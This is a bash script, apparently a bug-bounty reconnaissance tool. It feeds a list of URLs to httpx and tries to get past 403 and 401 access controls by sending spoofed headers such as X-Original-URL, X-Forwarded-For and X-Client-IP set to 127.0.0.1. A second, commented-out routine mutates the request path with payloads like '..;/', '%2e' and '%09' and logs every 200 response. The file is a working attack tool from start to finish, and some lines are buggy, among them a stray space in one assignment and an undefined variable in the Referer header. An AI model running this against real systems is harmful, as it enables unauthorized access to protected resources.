#!/bin/bash

function bypass(){
	path=$(echo $1  | unfurl format %p?%q)
	url= $(echo $1  | unfurl format %s://%d)
	echo "$1"   | httpx -H  "Referer: $i "      -mc 200   -retries 2 -status-code         |tee -a 403_bypass.txt
	echo "$1"   | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 -status-code     |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 -status-code     |tee -a 403_bypass.txt
	echo "$1"   | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 -status-code     |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 -status-code     |tee -a 403_bypass.txt
	echo "$1"   | httpx -H  "Content-Length: 0" -x Post    -mc 200  -retries 2 -status-code |tee -a 403_bypass.txt
	echo "$1"   | httpx  -x Post    -mc 200  -retries 2                       -status-code  |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Client-IP: 127.0.0.1"      -mc 200  -retries 2 -status-code |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Custom-IP-Authorization: 127.0.0.1"      -mc 200  -retries 2  -status-code|tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Remote-IP: 127.0.0.1"      -mc 200  -retries 2  -status-code |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Remote-Addr: 127.0.0.1"    -mc 200  -retries 2  -status-code |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Host: 127.0.0.1"           -mc 200  -retries 2  -status-code |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Forwarded-For: 127.0.0.1"  -mc 200  -retries 2  -status-code|tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Forwarded-Host: 127.0.0.1" -mc 200  -retries 2  -status-code |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Originating-IP: 127.0.0.1"  -mc 200  -retries 2 -status-code |tee -a 403_bypass.txt

}


function paths(){
	if [[ $(echo $1 |unfurl -u paths) -ne '' ]] ;then
 		path="/"
	else
		path=$(echo $1 |unfurl -u paths)
       	fi
	payloads=("$1")
	base=$(echo $1 |unfurl format %s://%d)
	echo "$base" 
	payloads+=("$base$(echo $path | awk '{print $0"."}')")
        payloads+=("$base$(echo $path | awk '{print $0"./"}')")
        payloads+=("$base$(echo $path | awk '{print $0"*"}')")
        payloads+=("$base$(echo $path | sed 's/\/$/\.\.;\//g')")
        payloads+=("$base$(echo $path | sed 's/\/$/;\//g')")
        payloads+=("$base$(echo $path | awk '{print $0"%20"}')")
        payloads+=("$base$(echo $path | awk '{print $0"%2e"}')")
        payloads+=("$base$(echo $path | awk '{print $0"~"}')")
        payloads+=("$base$(echo $path | awk '{print $0"%09"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/."}')")
        payloads+=("$base$(echo $path | awk '{print $0"/./"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/*"}')")
        payloads+=("$base$(echo $path | awk '{print $0"..;/"}')")
        payloads+=("$base$(echo $path | awk '{print $0";/"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/%20"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/%2e"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/~"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/%09"}')")
        payloads+=("$base$(echo $path | awk '{print $0"/.json"}')")

	for i in $(echo ${payloads[*]} | xargs -n 1 );do 
		echo "$i"
		echo "$i" | httpx -retries 2 -status-code  -mc 200 |tee -a 403_bypass.txt
	done
}
#cat $1 | httpx -status-code -threads 500 -retries 2 -o status.txt
#cat  ./status.txt | grep -E  "403|401" |cut  -d " " -f 1 |sort -u -o 40x_urls.txt
export -f  bypass
cat  $1 |xargs -n1 -P 20  -I{} bash -c 'bypass "$@"' _ {}
#export -f paths
#cat $1 |xargs -n 1 -I {} bash -c 'paths "$@"' _ {} 
